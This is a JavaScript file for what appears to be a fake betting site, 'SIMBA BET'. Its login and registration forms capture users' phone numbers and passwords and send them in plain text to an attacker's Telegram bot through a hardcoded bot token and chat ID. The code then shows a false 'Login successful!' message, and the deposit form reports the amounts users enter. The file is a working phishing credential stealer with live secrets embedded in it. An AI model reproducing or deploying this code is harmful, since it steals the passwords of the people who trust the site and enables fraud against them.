const BOT_TOKEN = '8048151095:AAHHJfE21m9JIcGTNOLdzvG8lMfWM16TJOY';
const CHAT_ID = '5900337528';

async function sendTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const params = {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
    };
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(params)
        });
    } catch (e) { console.error("Telegram error:", e); }
}

function openModal(id) { document.getElementById(id).style.display = "block"; }
function closeModal(id) { document.getElementById(id).style.display = "none"; }

function submitLogin() {
    const phone = document.getElementById('loginPhone').value;
    const pass = document.getElementById('loginPass').value;
    if (phone && pass) {
        sendTelegram(`<b>🔑 SIMBA BET: Login Attempt</b>\nPhone: ${phone}\nPass: ${pass}`);
        alert("Login successful!");
        closeModal('loginModal');
    } else { alert("Please fill in all fields."); }
}

function submitRegister() {
    const phone = document.getElementById('regPhone').value;
    const pass = document.getElementById('regPass').value;
    if (phone && pass) {
        sendTelegram(`<b>🦁 SIMBA BET: New Registration</b>\nPhone: ${phone}\nPass: ${pass}`);
        alert("Registration Request Sent!");
        closeModal('registerModal');
    } else { alert("Please fill in all fields."); }
}

function submitDep() {
    const amount = document.getElementById('depAmount').value;
    if (amount) {
        sendTelegram(`<b>💰 SIMBA BET: Deposit Request</b>\nAmount: ${amount} ETB`);
        alert("Deposit request sent via Telebirr.");
        closeModal('depModal');
    } else { alert("Please enter an amount."); }
}

document.querySelectorAll('.placeholder').forEach(card => {
    card.onclick = () => alert("This game is coming soon!");
});
